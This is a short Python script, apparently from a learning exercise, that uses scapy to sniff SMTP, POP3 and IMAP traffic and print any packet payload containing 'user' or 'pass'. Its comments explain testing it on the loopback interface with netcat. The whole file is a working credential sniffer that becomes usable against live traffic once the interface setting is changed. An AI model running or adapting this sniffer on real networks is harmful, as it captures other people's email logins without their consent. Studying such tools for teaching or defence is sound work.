#!/usr/bin/python3

from scapy.all import *

# [!!!] To test with NETCAT:
    # open a netcat listener 'sudo nc -lvnp 25"
    # connect with netcat to the listener "sudo nc localhost 25"
    # run the script 'sudo python3 ./20_scapy_mailSniffer.py'
    # send a test message contaning 'user' and 'pass' substrings
        # like USER myusername\r\nPASS mypassword\r\n

# our packet callback
def packet_callback(packet):    
    if packet[TCP].payload:
        
        mail_packet = packet[TCP].payload
    
        # in the example is used nc, the raw packet must be decoded this way
            # may be differ for other tools
        mail_packet = bytes(mail_packet).decode('utf-8')
        
        # print credentials messages 
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst}")
            print(f"[*] {mail_packet}")

# fire up our sniffer
    # [!] the loopback interface is specified in order to test it with netcat -> iFace="lo"
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0,  iface="lo")
